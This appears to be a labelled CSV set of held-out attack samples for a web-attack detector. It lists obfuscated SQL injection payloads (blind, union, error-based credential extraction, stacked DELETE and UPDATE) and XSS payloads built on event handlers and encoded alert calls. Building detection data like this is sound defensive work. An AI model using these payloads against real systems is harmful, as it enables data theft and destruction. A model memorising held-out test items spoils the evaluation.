text,label,attack_type,category,generator
"`+Or email=CHAR(114,111,111,116)-- 	",1,sqli,hex_obf,held_out
1/**_**/or	1beTweEn/**/0%0aaND+9/*!*/-- -,1,sqli,boolean_blind,held_out
<details/onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
"<object
onstart=eval(atob('YWxlcnQoMSk='))><!--comment-->",1,xss,stored,held_out
"""%20Or/**_**/token=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
'%0aOr SLeep(7)	-- 	,1,sqli,time_blind,held_out
';%0adEleTE from/**/sessions	-- -,1,sqli,stacked,held_out
' onstart=window['ale'+'rt']`1` ',1,xss,attribute,held_out
<video%20onbegin=%28alert%29%281%29>,1,xss,reflected,held_out
"%27/**_**/anD/*!*/extractvalue(1,concat(0x7e,(select/**_**/pwd/**/from	clients/**/limit/*!*/1)))#",1,sqli,error,held_out
"data:text/html,<svg onerror=window['ale'+'rt']`1`>",1,xss,dom,held_out
#<audio onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
"`%20Union	alL/**_**/sEleCt/**/0x78,NULL+FrOm	clients%20%2d%2d ",1,sqli,union,held_out
');/**_**/upDaTE/**_**/clients/*!*/sEt%09email=1%09#,1,sqli,stacked,held_out
%27;/**/wAitfoR%0aDElay/**_**/'0:0:8'/*!*/-- ,1,sqli,time_blind,held_out
')/**/OR/**_**/id=0x73656c656374#,1,sqli,hex_obf,held_out
1%20or/*!*/6=4+%2d%2d ,1,sqli,boolean_blind,held_out
"1/**/UNIOn%0aalL SelEct/*!*/0x78,CHAR(120)%09fRom/**/members #",1,sqli,union,held_out
'+or%0a'a'LiKE'b'%20-- 	,1,sqli,boolean_blind,held_out
'%20onload=alert(1)%20',1,xss,attribute,held_out
'%20ontoggle=eval(atob('YWxlcnQoMSk='))%20',1,xss,attribute,held_out
'/onerror=(alert)(1)/',1,xss,attribute,held_out
"` ANd	(select/*!*/count(*)%0afrom/**/tokens%20group/*!*/by	concat((select+token%09from%0aclients%09limit%091),floor(rand(0)*2)))%2d%2d ",1,sqli,error,held_out
"""%09or%09pwd=CHAR(114,111,111,116)/*z*/",1,sqli,hex_obf,held_out
'-window['ale'+'rt']`1`-',1,xss,attribute,held_out
"`%09AnD updatexml(1,concat(0x7e,(select%20role	from	clients%20limit+1)),1)-- 	",1,sqli,error,held_out
"1%20UNiOn%0aalL%09seLECt+NULL,password,NULL frOm%0aadmins/**_**/#",1,sqli,union,held_out
"1%20Union+All%0asElEct/*!*/CHAR(120),0x78,NULL%20FRoM sessions #",1,sqli,union,held_out
"""/**_**/anD/**_**/extractvalue(1,concat(0x7e,(select%09hash from+members%20limit%0a1)))-- ",1,sqli,error,held_out
"`%20aND%09updatexml(1,concat(0x7e,(select name/*!*/from staff/**/limit+1)),1)-- 	",1,sqli,error,held_out
<img%20onanimationstart=print()><!--stored-->,1,xss,stored,held_out
"data:text/html,<body onbegin=alert(1)>",1,xss,dom,held_out
<iframe%20onpointerover=alert%28String.fromCharCode%2888%2C83%2C83%29%29>,1,xss,reflected,held_out
"`%0aAnD+(select count(*)/**/from/**_**/staff/**_**/group by/*!*/concat((select%0apassword%20from%20clients%09limit	1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
"1	ANd/**_**/extractvalue(1,concat(0x7e,(select%0apwd%20from%20users limit/**/1)))-- ",1,sqli,error,held_out
"""%09ontoggle=top['al'+'ert'](1)%09x=""",1,xss,attribute,held_out
"""/**_**/OR/**_**/hash=0x756e696f6e-- -",1,sqli,hex_obf,held_out
%27	And/**/(SELECT+1+FRoM/**_**/(SELECT(sLEeP(3)))x)-- 	,1,sqli,time_blind,held_out
"""><iframe onload=window['ale'+'rt']`1`>",1,xss,attribute,held_out
`/**_**/Or%206betWeeN+0/*!*/And+9/*!*/-- -,1,sqli,boolean_blind,held_out
%27;%09updAtE/*!*/members+Set+name=1%09#,1,sqli,stacked,held_out
"""%09anD extractvalue(1,concat(0x7e,(select	id from/**/sessions/**_**/limit/**_**/1)))#",1,sqli,error,held_out
"<details
onanimationstart=eval%28atob%28%27YWxlcnQoMSk%3D%27%29%29>",1,xss,reflected,held_out
`;/**/UpDAtE%20accounts%0aSeT+id=1%20/*z*/,1,sqli,stacked,held_out
`;%0aWaiTfOR/**/dELAY	'0:0:8'%20#,1,sqli,time_blind,held_out
`/*!*/oR%20balance=0x70617373776f7264-- 	,1,sqli,hex_obf,held_out
